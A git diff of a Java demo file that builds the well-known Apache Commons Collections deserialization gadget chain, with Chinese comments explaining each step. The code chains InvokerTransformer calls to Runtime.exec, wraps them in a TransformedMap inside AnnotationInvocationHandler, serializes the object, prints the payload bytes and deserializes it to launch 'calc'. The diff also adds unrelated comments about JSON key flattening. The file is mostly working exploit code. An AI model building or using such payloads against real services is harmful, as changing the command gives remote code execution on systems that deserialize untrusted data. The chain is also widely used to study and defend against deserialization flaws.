@@ -22,34 +22,44 @@ import java.util.Map;
  */
 public class CommonsCollectionsTest {
 
-	public static void main(String[] args) {
-		String cmd = "open -a Calculator.app";
+    public static void main(String[] args) throws Exception {
+        // String cmd = "open -a Calculator.app";
+        String cmd = "calc";
 
-		Transformer[] transformers = new Transformer[]{
-				new ConstantTransformer(Runtime.class),
-				new InvokerTransformer("getMethod", new Class[]{
-						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
-				),
-				new InvokerTransformer("invoke", new Class[]{
-						Object.class, Object[].class}, new Object[]{null, new Object[0]}
-				),
-				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
-		};
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{
+                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
+                ),
+                new InvokerTransformer("invoke", new Class[]{
+                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
+                ),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
+        };
 
-		// 创建ChainedTransformer调用链对象
-		Transformer transformedChain = new ChainedTransformer(transformers);
+        // (
+        //         Runtime.getRuntime()
+        // ).exec("cmd");
 
-		// 创建Map对象
-		Map map = new HashMap();
+        // 创建ChainedTransformer调用链对象
+        Transformer transformedChain = new ChainedTransformer(transformers);
 
-		// map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
-		// AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
-		// 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
-		// 类调用其自身实现的readObject方法时无法通过if判断也就无法通过调用到setValue方法了。
-		map.put("value", "value");
 
-		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
-		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
+        // {  a : { b : "123" } }  ————————————>    {   "a.b"  :  "123"  }
+        //
+        // {   "tilte_1" : {  cn:"今日头条新闻" , en : "Today Top News" }  }   ————————————————> 中文用户，看这个 {  "title_1" : "今日头条新闻"   } 、 英文用户，看这个  {  "title_1" : "Today Top News" }
+
+        // 创建Map对象
+        Map map = new HashMap();
+
+        // map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
+        // AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
+        // 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
+        // 类调用其自身实现的readObject方法时无法通过if判断也就无法通过调用到setValue方法了。
+        map.put("value", "value");
+
+        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
+        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
 
 //		// 遍历Map元素，并调用setValue方法
 //		for (Object obj : transformedMap.entrySet()) {
@@ -61,51 +71,51 @@ public class CommonsCollectionsTest {
 //
 //		transformedMap.put("v1", "v2");// 执行put也会触发transform
 
-		try {
-			// 获取AnnotationInvocationHandler类对象
-			Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        try {
+            // 获取AnnotationInvocationHandler类对象
+            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
 
-			// 获取AnnotationInvocationHandler类的构造方法
-			Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+            // 获取AnnotationInvocationHandler类的构造方法
+            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
 
-			// 设置构造方法的访问权限
-			constructor.setAccessible(true);
+            // 设置构造方法的访问权限
+            constructor.setAccessible(true);
 
-			// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
-			// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
-			Object instance = constructor.newInstance(Target.class, transformedMap);
+            // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
+            // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
+            Object instance = constructor.newInstance(Target.class, transformedMap);
 
-			// 创建用于存储payload的二进制输出流对象
-			ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            // 创建用于存储payload的二进制输出流对象
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
 
-			// 创建Java对象序列化输出流对象
-			ObjectOutputStream out = new ObjectOutputStream(baos);
+            // 创建Java对象序列化输出流对象
+            ObjectOutputStream out = new ObjectOutputStream(baos);
 
-			// 序列化AnnotationInvocationHandler类
-			out.writeObject(instance);
-			out.flush();
-			out.close();
+            // 序列化AnnotationInvocationHandler类
+            out.writeObject(instance);
+            out.flush();
+            out.close();
 
-			// 获取序列化的二进制数组
-			byte[] bytes = baos.toByteArray();
+            // 获取序列化的二进制数组
+            byte[] bytes = baos.toByteArray();
 
-			// 输出序列化的二进制数组
-			System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));
+            // 输出序列化的二进制数组
+            System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));
 
-			// 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
-			ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
+            // 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
+            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
 
-			// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
-			ObjectInputStream in = new ObjectInputStream(bais);
+            // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
+            ObjectInputStream in = new ObjectInputStream(bais);
 
-			// 模拟远程的反序列化过程
-			in.readObject();
+            // 模拟远程的反序列化过程
+            in.readObject();
 
-			// 关闭ObjectInputStream输入流
-			in.close();
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+            // 关闭ObjectInputStream输入流
+            in.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
 }
